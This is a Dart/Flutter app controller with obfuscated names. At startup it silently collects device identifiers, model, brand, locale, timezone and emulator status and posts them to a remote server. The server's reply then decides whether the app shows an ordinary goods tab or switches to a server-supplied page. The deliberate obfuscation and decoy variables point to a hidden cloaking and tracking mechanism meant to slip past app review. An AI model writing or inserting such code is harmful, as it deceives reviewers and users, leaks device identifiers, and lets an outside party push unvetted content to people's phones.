import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var yxqpgmaw = RxBool(false);
  var vgnmwtd = RxBool(true);
  var apuogwh = RxString("");
  var saul = RxBool(false);
  var von = RxBool(true);
  final btgrvoafqs = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    tfzv();
  }


  Future<void> tfzv() async {

    saul.value = true;
    von.value = true;
    vgnmwtd.value = false;

    btgrvoafqs.post("https://hia.anti.mom/wfnlxjpvsgtediaouqkycbmhzr",data: await tpckszn()).then((value) {
      var ilzsua = value.data["ilzsua"] as String;
      var fkhinxv = value.data["fkhinxv"] as bool;
      if (fkhinxv) {
        apuogwh.value = ilzsua;
        enola();
      } else {
        mante();
      }
    }).catchError((e) {
      vgnmwtd.value = true;
      von.value = true;
      saul.value = false;
    });
  }

  Future<Map<String, dynamic>> tpckszn() async {
    final DeviceInfoPlugin nimxdlbu = DeviceInfoPlugin();
    PackageInfo ifakchwz_gywaels = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var imzd = Platform.localeName;
    var pibvkg = currentTimeZone;

    var kminfwd = ifakchwz_gywaels.packageName;
    var gfqlwem = ifakchwz_gywaels.version;
    var ykaom = ifakchwz_gywaels.buildNumber;

    var uvaqs = ifakchwz_gywaels.appName;
    var sfwnkzcl = "";
    var alfonsoPfeffer = "";
    var wsnrmz = "";
    var elroyHomenick = "";
    var adrielCasper = "";
    var myrtleKoelpin = "";
    var aryannaKozey = "";
    var ngfvzhbw  = "";
    var karolannSawayn = "";
    var annabelRitchie = "";


    var lkndy = "";
    var tfcmi = false;

    if (GetPlatform.isAndroid) {
      lkndy = "android";
      var fukvsigdcr = await nimxdlbu.androidInfo;

      wsnrmz = fukvsigdcr.brand;

      sfwnkzcl  = fukvsigdcr.model;
      ngfvzhbw = fukvsigdcr.id;

      tfcmi = fukvsigdcr.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      lkndy = "ios";
      var urfkbngzy = await nimxdlbu.iosInfo;
      wsnrmz = urfkbngzy.name;
      sfwnkzcl = urfkbngzy.model;

      ngfvzhbw = urfkbngzy.identifierForVendor ?? "";
      tfcmi  = urfkbngzy.isPhysicalDevice;
    }
    var res = {
      "alfonsoPfeffer" : alfonsoPfeffer,
      "ykaom": ykaom,
      "gfqlwem": gfqlwem,
      "aryannaKozey" : aryannaKozey,
      "pibvkg": pibvkg,
      "lkndy": lkndy,
      "wsnrmz": wsnrmz,
      "karolannSawayn" : karolannSawayn,
      "adrielCasper" : adrielCasper,
      "ngfvzhbw": ngfvzhbw,
      "imzd": imzd,
      "tfcmi": tfcmi,
      "uvaqs": uvaqs,
      "myrtleKoelpin" : myrtleKoelpin,
      "elroyHomenick" : elroyHomenick,
      "sfwnkzcl": sfwnkzcl,
      "annabelRitchie" : annabelRitchie,
      "kminfwd": kminfwd,

    };
    return res;
  }

  Future<void> mante() async {
    Get.offAllNamed("/goodsTab");
  }

  Future<void> enola() async {
    Get.offAllNamed("/product");
  }

}
